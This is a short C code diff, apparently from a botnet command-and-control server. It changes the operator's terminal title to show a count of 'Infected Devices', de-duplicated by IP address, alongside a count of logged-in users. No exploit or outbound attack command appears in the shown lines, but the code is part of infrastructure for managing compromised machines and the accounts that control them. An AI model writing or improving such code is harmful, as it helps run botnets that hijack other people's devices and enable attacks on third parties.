@@ -21,17 +21,32 @@ void* update_title(void* arg) {
 
     while (1) {
         int valid_bots = 0;
+        int users_online = 0;
 
         pthread_mutex_lock(&bot_mutex);
         for (int i = 0; i < bot_count; i++) {
-            if (bots[i].is_valid) {
-                valid_bots++;
+            if (!bots[i].is_valid) continue;
+            int is_duplicate = 0;
+            for (int j = 0; j < i; j++) {
+                if (bots[j].is_valid && bots[j].address.sin_addr.s_addr == bots[i].address.sin_addr.s_addr) {
+                    is_duplicate = 1;
+                    break;
+                }
             }
+            if (!is_duplicate) valid_bots++;
         }
         pthread_mutex_unlock(&bot_mutex);
 
-        char buffer[64] = {0};
-        int written = snprintf(buffer, sizeof(buffer), "\0337\033]0;Infected Devices: %d\007\0338", valid_bots);
+        pthread_mutex_lock(&user_sockets_mutex);
+        for (int i = 0; i < user_count; i++) {
+            if (users[i].is_logged_in) {
+                users_online++;
+            }
+        }
+        pthread_mutex_unlock(&user_sockets_mutex);
+
+        char buffer[128] = {0};
+        int written = snprintf(buffer, sizeof(buffer), "\0337\033]0;Infected Devices: %d | Users Online: %d\007\0338", valid_bots, users_online);
         if (written > 0 && written < (int)sizeof(buffer) && client_socket > 0) {
             if (send(client_socket, buffer, (size_t)written, 0) < 0) break;
         }
